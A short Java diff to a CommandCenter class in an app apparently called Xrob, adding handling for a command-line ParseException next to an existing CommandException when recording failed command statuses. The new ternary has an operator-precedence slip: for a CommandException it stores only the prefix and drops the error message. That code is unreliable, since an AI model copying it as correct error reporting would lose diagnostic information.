@@ -10,6 +10,7 @@ import com.theah64.xrob.models.Command;
 import com.theah64.xrob.utils.APIRequestGateway;
 
 import org.acra.ACRA;
+import org.apache.commons.cli.ParseException;
 import org.json.JSONException;
 import org.json.JSONObject;
 
@@ -53,9 +54,11 @@ public class CommandCenter {
                     }
                 });
 
-            } catch (BaseCommand.CommandException e) {
+            } catch (BaseCommand.CommandException | ParseException e) {
                 e.printStackTrace();
-                commandStatusesTable.addv2(new Command.Status(commandId, Command.Status.STATUS_FAILED, "CommandException: " + e.getMessage()));
+                commandStatusesTable.addv2(new Command.Status(commandId, Command.Status.STATUS_FAILED,
+                        e instanceof BaseCommand.CommandException ? "CommandException: " : "Parse exception: " +
+                                e.getMessage()));
                 syncCommandStatus(context);
             }
 
